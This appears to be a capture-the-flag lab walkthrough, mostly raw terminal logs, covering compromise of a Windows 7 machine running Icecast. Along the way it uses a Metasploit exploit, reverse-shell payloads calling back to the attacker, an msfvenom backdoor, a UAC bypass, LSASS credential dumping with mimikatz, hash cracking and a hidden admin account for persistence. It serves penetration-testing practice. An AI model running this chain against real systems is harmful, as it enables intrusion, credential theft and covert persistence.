# Checking connection with target, seems lie its blocking ping

┌──(kali㉿kali)-[~]
└─$ `ping 10.10.5.26`
PING 10.10.5.26 (10.10.5.26) 56(84) bytes of data.

# Checking open ports

┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.5.26 -sS -Pn
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-17 00:13 EST
Nmap scan report for 10.10.5.26
Host is up (0.15s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 89.46 seconds
                                                                                                                                                                     
# Checking servicees running

┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.5.26 -p 135,445,3389,5357,8000 -sV`
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-17 00:16 EST
Nmap scan report for 10.10.5.26
Host is up (0.14s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http         Icecast streaming media server
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds

# Searching on Icecast on exploit db and searchsploit, getting some error in compiling so moving on with metasploit 

Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                | windows/remote/568.c

# Checking on metasploit

msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

msf6 > 

# Exploiting with LHOST as tryhackmen netwwork interface tun0

msf6 >` use 0`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > `set RHOSTS 10.10.5.26`
RHOSTS => 10.10.5.26
msf6 exploit(windows/http/icecast_header) > `set LHOST 10.17.107.227`
LHOST => 10.17.107.227
msf6 exploit(windows/http/icecast_header) > `run`

[*] Started reverse TCP handler on 10.17.107.227:4444 
[*] Sending stage (175686 bytes) to 10.10.5.26
[*] Meterpreter session 1 opened (10.17.107.227:4444 -> 10.10.5.26:49190) at 2024-01-17 00:27:12 -0500

meterpreter > `sysinfo`
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pgrep explorer
1328
meterpreter > migrate 1328
[*] Migrating from 2288 to 1328...
[*] Migration completed successfully.
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > `ps`

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 100   692   svchost.exe
 416   4     smss.exe
 508   692   svchost.exe
 544   536   csrss.exe
 564   2288  cmd.exe               x86   1        Dark-PC\Dark  C:\Windows\SysWOW64\cmd.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 820   692   svchost.exe
 860   1644  mscorsvw.exe
 888   692   svchost.exe
 936   692   svchost.exe
 1056  692   svchost.exe
 1076  604   conhost.exe           x64   1        Dark-PC\Dark  C:\Windows\System32\conhost.exe
 1140  692   svchost.exe
 1268  692   spoolsv.exe
 1316  692   svchost.exe
 1412  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1468  100   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1492  1436  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1532  820   WmiPrvSE.exe
 1644  692   mscorsvw.exe
 1648  692   amazon-ssm-agent.exe
 1720  692   LiteAgent.exe
 1760  692   svchost.exe
 1816  1888  powershell.exe        x86   1
 1900  692   Ec2Config.exe
 2108  692   svchost.exe
 2116  604   conhost.exe           x64   1
 2208  692   vds.exe
 2284  692   sppsvc.exe
 2288  1492  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2452  692   TrustedInstaller.exe
 2516  692   SearchIndexer.exe

meterpreter > 


# lets try to ecalate privileges

meterpreter > `getsystem`
[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter > 


# Now to esclate privileges lets see what exploit options we have using exploit_suggestor

msf6 post(multi/recon/local_exploit_suggester) > `run`

============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

# We found one `UAC bypass exploit` exploit/windows/local/bypassuac_eventvwr, before using it lets try to bypass UAC manually by akagai

# lets create our backdoor payload first

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.107.227 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls
backdoor.exe  Desktop  Documents  Downloads  file1.txt  file1.txt.gpg  hash  Music  Pictures  Public  rockyou.txt  Security  Templates  test  UACME  Videos

# Now lets upload this payload and akagai.exe in tmp on target

# We  need tp compile the git code to get Akagai executable so exploitintg it using metasploit module

msf6 exploit(windows/local/bypassuac_eventvwr) >` run`

[*] Started reverse TCP handler on 10.17.107.227:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.10.25.129
[*] Meterpreter session 2 opened (10.17.107.227:4444 -> 10.10.25.129:49188) at 2024-01-18 01:35:12 -0500
[*] Cleaning up registry keys ...

# Now if we check our privileges we can see have option to migrate on processes running with NT Authority

meterpreter > `getuid`
Server username: Dark-PC\Dark
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > `ps`

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 100   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 508   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 564   2288  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 820   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 888   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 936   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1056  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1076  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 1140  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1316  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1412  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1468  100   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1492  1436  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1532  820   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1648  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1720  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1760  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1816  1888  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 1900  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 2108  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2116  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2208  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2284  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2288  1492  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2452  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2516  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe

meterpreter > 


# Now our next goal is to get hashes, For this we will use Mimikatz ,`Mimikatz` interacts with the `LSASS` process and try and dump the cache of these process in order to identify the `NTLM hashes`, 

# In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass.So first thing we need to do is to migrate to lsass

meterpreter > `pgrep lsass`
700
meterpreter >` migrate 700`
[*] Migrating from 1816 to 700...
[*] Migration completed successfully.
meterpreter > `sysinfo`
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 

# Also now we are having NT Authority privileges
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM

# Lets dump hashes using `hashdump` and mimikatz metermreter module `kiwi`

meterpreter > `hashdump`
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 


meterpreter > `load kiwi`
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > `creds_all`
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)


meterpreter > 

# We now have done the `Initial access exploitation`, '`Privilege Escalation` and `Hash dumping`, now we need to do `Post Exploitation activites` and also `maintain persistence`

# So we can do many post exploitation activities using meterprter, but lets now focus on maintaining persistence

# for this machine we see we have open  RDP port `3389`

# Lets crack password using hash using `john`, we can use these password to RDP into the machine

┌──(kali㉿kali)-[~]
└─$ `echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::" > hash.txt`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `sudo john --format=NT --wordlist=rockyou.txt hash.txt`
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)     
1g 0:00:00:00 DONE (2024-01-18 02:12) 100.0g/s 480000p/s 480000c/s 480000C/s 77777777..525252
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `echo "Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::" > hash.txt `       
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `sudo john --format=NT --wordlist=rockyou.txt hash.txt `                                          
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Password01!      (Dark)     
1g 0:00:00:00 DONE (2024-01-18 02:14) 5.555g/s 11685Kp/s 11685Kc/s 11685KC/s Password31..Paris13
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                     

# Since we only have `3389` open ,best way of persistence is to use meterpreter `getgui`, this will enable rdp if disabled, it will then create a user and add it to local group 'Administrators' so that it will have NT authority access

# seemed like getgui is deprecate so had to use module `windows/manage/enable_rdp`

meterpreter > run getgui -e -u sam -p hacker_123321

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[-] The specified meterpreter session script could not be found: getgui
meterpreter > 
Background session 2? [y/N]  
msf6 exploit(windows/local/bypassuac_eventvwr) > use post/windows/manage/enable_rdp
msf6 post(windows/manage/enable_rdp) > options

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT     3389             no        Local port to forward remote connection.
   PASSWORD                   no        Password for the user created.
   SESSION                    yes       The session to run this module on
   USERNAME                   no        The username of the user to create.


View the full module info with the info, or info -d command.

msf6 post(windows/manage/enable_rdp) > set USERNAME sam
USERNAME => sam
msf6 post(windows/manage/enable_rdp) > set PASSWORD hacker_123321
PASSWORD => hacker_123321
msf6 post(windows/manage/enable_rdp) > set SESSION 2
SESSION => 2
msf6 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] Setting user account for logon
[*]     Adding User: sam with Password: hacker_123321
[*]     Adding User: sam to local group 'Remote Desktop Users'
[*]     Hiding user from Windows Login screen
[*]     Adding User: sam to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt
[*] Post module execution completed
msf6 post(windows/manage/enable_rdp) > 

# We now have our user `sam` added

msf6 post(windows/manage/enable_rdp) > `sessions 2`
[*] Starting interaction with 2...

meterpreter > `shell`
Process 3380 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>`net users`
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Dark                     Guest                    
sam                      
The command completed with one or more errors.

C:\Windows\system32>`net localgroup administrators`
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Dark
sam
The command completed successfully.


# We can now RDP into machine even after loosing access using our users `sam` and `Dark`

┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:Dark /p:Password01! /v:10.10.202.121:3389
[07:06:18:280] [5883:5884] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:06:18:280] [5883:5884] [WARN][com.freerdp.crypto] - CN = Dark-PC
[07:06:18:282] [5883:5884] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:06:18:282] [5883:5884] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:06:18:282] [5883:5884] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:06:18:282] [5883:5884] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.202.121:3389) 
[07:06:18:282] [5883:5884] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:06:18:283] [5883:5884] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:06:18:283] [5883:5884] [ERROR][com.freerdp.crypto] -        Dark-PC
[07:06:18:283] [5883:5884] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.202.121:3389 (RDP-Server):
        Common Name: Dark-PC
        Subject:     CN = Dark-PC
        Issuer:      CN = Dark-PC
        Thumbprint:  0c:f3:ec:c2:12:0f:6f:aa:07:e9:96:8e:ff:2d:b0:c2:53:14:6b:d3:53:79:fc:82:0e:1a:a9:7b:67:2e:e6:c1
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[07:06:23:832] [5883:5884] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:06:23:832] [5883:5884] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:06:23:874] [5883:5884] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:06:23:875] [5883:5884] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:06:34:769] [5883:5883] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]

──(kali㉿kali)-[~]
└─$ xfreerdp /u:sam /p:hacker_123321 /v:10.10.202.121:3389
[07:57:46:576] [19368:19369] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:57:46:576] [19368:19369] [WARN][com.freerdp.crypto] - CN = Dark-PC
[07:57:46:980] [19368:19369] [ERROR][com.freerdp.core.transport] - transport_ssl_cb: ACCESS DENIED
[07:57:46:980] [19368:19369] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_AUTHENTICATION_FAILED [0x00020009]
[07:57:46:981] [19368:19369] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:0A000419:SSL routines::tlsv1 alert access denied
                                                                                                                                                                                                                                           
# The last thing as a pentest we would do is to clear stuff that we added, we used post exploitation module enable_rdp, which added a user and all, the module provided us a `resource file` which we can use 

[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt

┌──(kali㉿kali)-[~]
└─$ `cat  /home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt`
execute -H -f cmd.exe -a "/c sc config termservice start= disabled"
execute -H -f cmd.exe -a "/c sc stop termservice"
execute -H -f cmd.exe -a "/c 'netsh firewall set service type = remotedesktop mode = enable'"
execute -H -f cmd.exe -a "/c net user sam /delete"
reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v sam
                                                                                                                                                                                                                                           
meterpreter > `resource /home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt`
[*] Processing /home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt for ERB directives.
resource (/home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt)> execute -H -f cmd.exe -a "/c sc config termservice start= disabled"
Process 3228 created.
resource (/home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt)> execute -H -f cmd.exe -a "/c sc stop termservice"
Process 2132 created.
resource (/home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt)> execute -H -f cmd.exe -a "/c 'netsh firewall set service type = remotedesktop mode = enable'"
Process 3972 created.
resource (/home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt)> execute -H -f cmd.exe -a "/c net user sam /delete"
Process 4004 created.
resource (/home/kali/.msf4/loot/20240118074637_default_10.10.202.121_host.windows.cle_001430.txt)> reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v sam
[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.
meterpreter > 


# we can see it removed user addedd by enable_rdp and process addedd

meterpreter > `shell`
Process 3420 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>`net users `
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Dark                     Guest                    
The command completed with one or more errors.


C:\Windows\system32>
